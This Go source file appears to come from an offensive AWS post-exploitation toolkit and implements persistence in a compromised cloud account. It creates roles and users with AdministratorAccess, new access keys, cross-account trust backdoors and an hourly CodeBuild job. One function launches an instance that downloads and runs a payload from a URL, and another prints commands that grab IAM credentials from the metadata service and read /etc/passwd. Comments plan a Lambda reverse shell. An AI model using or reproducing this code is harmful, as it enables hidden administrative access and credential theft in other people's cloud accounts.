package awsdata

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/url"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/ec2"
	"github.com/drk1wi/Modlishka/log"
)

type Policy struct {
	Version   string
	Statement []StatementEntr
}

type StatementEntr struct {
	Effect    string
	Action    string
	Principal PrincipalEntry
}

type PrincipalEntry struct {
	AWS     []string
	Service []string
}

//Persist Existing Instance SSM. WIP
func PersistSSMExisting(sess *session.Session) {
	instances := DescribeInstances(sess)
	for _, i := range instances {
		fmt.Println(i.Instances)
		for _, in := range i.Instances {
			fmt.Println(in.InstanceId)
		}
	}
	ListInstanceProfiles(sess)
	time.Sleep(5 * time.Second)
	AssociateIamInstanceProfile(sess, "Org-Admin", "i-0")
	time.Sleep(5 * time.Second)
	SendCommand(sess, "i-0", "whoami")
}

//PersistAccessKey creates a new access key on user
func PersistAccessKey(sess *session.Session, username string) {

	//Create new access key on another user
	key := CreateAccessKey(sess, username)
	if key != nil {
		log.Infof("%v", key)
	}
}

//PersistEC2 creates IAM InstanceProfile / Role w/ admin policy and launches the instance with a payload inside of userdata.
func PersistEC2(sess *session.Session, ami string, payload string) {
	if len(ami) > 0 {
		ami = "ami-013f17f36f8b1fefb"
	}

	profile := &ec2.IamInstanceProfileSpecification{
		Name: aws.String("OrgAdmin"),
	}

	userData := fmt.Sprintf(`#!/bin/bash
	curl %s -o /tmp/run
	cd /tmp
	sudo su ubuntu
	sudo chmod +x run
	sudo ./run &`, payload)

	dataEnc := base64.StdEncoding.EncodeToString([]byte(userData))

	ec2data := &ec2.RunInstancesInput{
		// An Amazon Linux AMI ID for t2.micro instances in the us-west-2 region
		ImageId:            aws.String(ami),
		InstanceType:       aws.String("t2.micro"),
		MinCount:           aws.Int64(1),
		MaxCount:           aws.Int64(1),
		UserData:           aws.String(dataEnc),
		IamInstanceProfile: profile,
	}
	// Create instance profile
	log.Infof("CreateInstanceProfile OrgAdmin")
	CreateInstanceProfile(sess, "OrgAdmin")
	time.Sleep(2 * time.Second)

	//Create role
	log.Infof("CreateRole OrgAdmin with ec2 trust relationship")
	CreateRole(sess, "OrgAdmin", TrustPolicyService("ec2.amazonaws.com"))
	time.Sleep(2 * time.Second)

	//Attach admin policy to newly created role
	log.Infof("AttachRolePolicy OrgAdmin")
	AttachRolePolicy(sess, "OrgAdmin", "arn:aws:iam::aws:policy/AdministratorAccess")
	time.Sleep(2 * time.Second)

	//Add role to the instance profile
	log.Infof("AddRoleToInstanceProfile OrgAdmin")
	AddRoleToInstanceProfile(sess, "OrgAdmin")
	time.Sleep(5 * time.Second)

	//Create instance with userdata payload
	log.Infof("RunInstance")
	RunInstance(sess, ec2data)
}

//PersistSSM creates IAM InstanceProfile / Role w/ admin policy and launches the instance with a payload inside of userdata.
func PersistSSM(sess *session.Session, ami string) {

	if len(ami) > 0 {
		ami = "ami-013f17f36f8b1fefb"
	}

	profile := &ec2.IamInstanceProfileSpecification{
		Name: aws.String("OrgAdmin"),
	}

	ec2data := &ec2.RunInstancesInput{
		// An Amazon Linux AMI ID for t2.micro instances in the us-west-2 region
		ImageId:            aws.String(ami),
		InstanceType:       aws.String("t2.micro"),
		MinCount:           aws.Int64(1),
		MaxCount:           aws.Int64(1),
		IamInstanceProfile: profile,
	}

	// Create instance profile
	CreateInstanceProfile(sess, "OrgAdmin")
	time.Sleep(2 * time.Second)

	//Create Role
	CreateRole(sess, "OrgAdmin", TrustPolicyService("ec2.amazonaws.com"))
	time.Sleep(2 * time.Second)

	//Attach admin policy to newly created role
	AttachRolePolicy(sess, "OrgAdmin", "arn:aws:iam::aws:policy/AdministratorAccess")
	time.Sleep(2 * time.Second)

	//Add role to the instance profile
	AddRoleToInstanceProfile(sess, "OrgAdmin")
	time.Sleep(5 * time.Second)

	//Create new instance and check when status changed to running
	instance := RunInstance(sess, ec2data)
	for {
		status := ec2Status(sess, instance)
		time.Sleep(1 * time.Second)
		if len(status) == 1 {
			break
		}
	}
	time.Sleep(20 * time.Second)

	//Example send-commands
	fmt.Println("Try it: send-command " + instance + " \"cat /etc/passwd\"")
	fmt.Println("Grab Token: send-command " + instance + " \"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/OrgAdmin\"")
}

func PersistCrossAccountRole(sess *session.Session, account string) {
	policy := TrustPolicyAWS(account)
	roleCreate := CreateRole(sess, "OrganizationalTesting", policy)
	if roleCreate != "" {
		log.Infof("* Creating role: OrganizationalTesting")
		log.Infof("* Adding sts:AssumeRole trust policy for account: %v", account)
	}
	log.Infof("* Attaching Administrator policy to role: OrganizationalTesting")
	time.Sleep(time.Second * 20)
	AttachRolePolicy(sess, "OrganizationalTesting", "arn:aws:iam::aws:policy/AdministratorAccess")
}

func PersistUpdateAssumeRole(sess *session.Session, role string, crossArn string, t string) {
	rando := SetTrackingAction(t, "role-persist")

	//Create Empty Policy
	pol := Policy{
		Version: "2008-10-17",
		Statement: []StatementEntr{
			{
				Effect:    "Allow",
				Action:    "sts:AssumeRole",
				Principal: PrincipalEntry{},
			},
		},
	}

	r := GetRole(sess, role)
	decodedValue, err := url.QueryUnescape(aws.StringValue(r.Role.AssumeRolePolicyDocument))
	if err != nil {
		log.Fatal(err)
	}

	_, _, principal := GetTrustPolicy(decodedValue)

	for k, v := range principal {
		prince := fmt.Sprintf("%s", v)
		if k == "AWS" {
			addAWS := PrincipalEntry{
				AWS: []string{
					prince,
				},
			}
			pol.Statement[0].Principal.AWS = append(pol.Statement[0].Principal.AWS, addAWS.AWS...)
		}
		if k == "Service" {
			addService := PrincipalEntry{
				Service: []string{
					prince,
				},
			}
			pol.Statement[0].Principal.Service = append(pol.Statement[0].Principal.Service, addService.Service...)
		}

	}

	//Add cross account arn
	addAWS := PrincipalEntry{
		AWS: []string{
			crossArn,
		},
	}
	pol.Statement[0].Principal.AWS = append(pol.Statement[0].Principal.AWS, addAWS.AWS...)

	b, err := json.Marshal(pol)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("UA Tracking: exec-env/" + rando)

	fmt.Println(string(b))

	UpdateAssumeRolePolicy(sess, role, string(b))

}

func PersistAddUserToGroup(sess *session.Session, group string, user string) {
	//look for privileged groups if found add user
	status := AddUserToGroup(sess, group, user)
	if status {
		log.Infof("%v Added tp %v.", user, group)
	}
}

func PersistCreateUser(sess *session.Session, user string) {
	//create user and add access key || add login profile
	status := CreateUser(sess, user)
	if status {
		log.Infof("%v Created.", user)
		policy := AttachUserPolicy(sess, user, "arn:aws:iam::aws:policy/AdministratorAccess")
		if policy {
			log.Infof("Attached AdministratorAccess Policy")
			key := CreateAccessKey(sess, user)
			if key != nil {
				log.Infof("%v", key)
			}
		}
	}

}

func PersistLambda() {
	//Add lambda with reverse shell fire with event bridge
	//https://docs.aws.amazon.com/eventbridge/latest/userguide/run-lambda-schedule.html
}

func PersistECS() {

}

func PersistCognito() {

}

func PersistCodeBuild(sess *session.Session, url string) {
	policyId := String(10)
	policyName := "Amazon_CodeBuild_" + policyId

	policy := TrustPolicyService("codebuild.amazonaws.com")
	roleArn := CreateRole(sess, policyName, policy)
	if roleArn != "" {
		log.Infof("* Creating role: %s", policyName)
		log.Infof("* Adding sts:AssumeRole trust policy for service: codebuild.amazonaws.com")
	}
	log.Infof("* Attaching Administrator policy to role: %s", policyName)
	time.Sleep(time.Second * 20)
	AttachRolePolicy(sess, policyName, "arn:aws:iam::aws:policy/AdministratorAccess")
	projArn, projName := CreateProject(sess, url, roleArn)
	time.Sleep(time.Second * 5)

	//Create Cron job to run build every hour from eventbridge
	eventRoleName := "EventBridge-Amazon_CodeBuild_" + policyId
	eventPolicy := TrustPolicyService("events.amazonaws.com")
	eventRoleArn := CreateRole(sess, eventRoleName, eventPolicy)
	if eventRoleArn != "" {
		log.Infof("* Creating role: %s", eventRoleName)
		log.Infof("* Adding sts:AssumeRole trust policy for service: events.amazonaws.com")
	}
	log.Infof("* Attaching policy to role: %s", eventRoleName)
	time.Sleep(time.Second * 20)

	jsonPolicy := `{
		"Version": "2012-10-17",
		"Statement": [
			{
				"Effect": "Allow",
				"Action": [
					"codebuild:StartBuild"
				],
				"Resource": [
					"*"
				]
			}
		]
	}`
	eventPolicyId := String(10)
	eventPolicyName := "Amazon_CodeBuild_Policy_" + eventPolicyId
	policyArn := CreatePolicy(sess, eventPolicyName, jsonPolicy)

	AttachRolePolicy(sess, eventRoleName, policyArn)

	ruleName := PutRule(sess, "AutomationDev-")
	PutTarget(sess, projArn, eventRoleArn, ruleName)

	//Kick off initial build
	StartBuild(sess, projName)

}

func PersistCodeCommit() {
	//backdoor Code Commit Credentials iam:createservicespecificcredential

}
